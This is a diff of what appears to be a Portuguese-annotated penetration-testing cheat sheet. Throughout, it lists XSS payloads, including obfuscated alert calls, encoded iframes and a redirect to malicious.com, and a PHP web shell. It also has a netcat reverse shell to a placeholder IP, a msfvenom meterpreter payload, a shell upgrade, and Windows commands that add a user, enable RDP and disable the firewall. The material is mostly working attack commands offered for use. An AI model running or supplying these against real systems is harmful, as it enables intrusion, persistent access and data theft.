@@ -180,54 +180,32 @@ academy.net/?__proto__[foo]=bar
 
 ```
 <script>alert('Pentester')</script>
-```
 
-```
 <script>alert`1`</script> | echo "INJETAR SCRIPT NA ATENTATIVA DE DAR BYPASS"
-```
 
-```
 <img src=x onerror=alert`1`>
 <img src=x OnerrOr=alert`1`>
-```
 
-```
 javascript:alert('XSS href')
-```
 
-```
 <img src="invalid.jpg" onerror="alert('XSS IMG!')">
-```
 
-```
 <img src="x" onerror="window['aler'+'t']('XSS OnError!')">
-```
 
-```
 <iframe src="https://www.retrogames.cc/embed/10030-street-fighter-ii-champion-edition-street-fighter-2-920513-etc.html" width="600" height="450" </iframe>
-```
 
-```
 <iframe src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4="></iframe>
-```
 
-```
 <iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"></iframe>
-```
 
-```
 <script>window.location='http://malicious.com'</script>
-```
 
-```
 ?param=1';alert(1)//  | USAR EM UM CENARIO EM QUE O PARAMETRO EXECUTA ALGO DENTRO DE UM SCRIPT. ANALISAR E AJUSTAR O CODIGO DE ACORDO. OBSERVAR ERRO NO CONSOLE
 ```
 
 ```
 <?php system($_GET['hacker']);?>
-```
 
-```
 <?php system('id');?>
 ```
 
@@ -246,10 +224,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
 ```
 
 ```
-python3 -m http.server 8080
-```
-
-```
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
 ```
 
@@ -259,21 +233,13 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ```
 net user suporte 12345 /add
-```
 
-```
 net localgroup "Remote Desktop Users" suporte /ad
-```
 
-```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-```
 
-```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
-```
 
-```
 NetSh Advfirewall set allprofiles state off
 ```
 
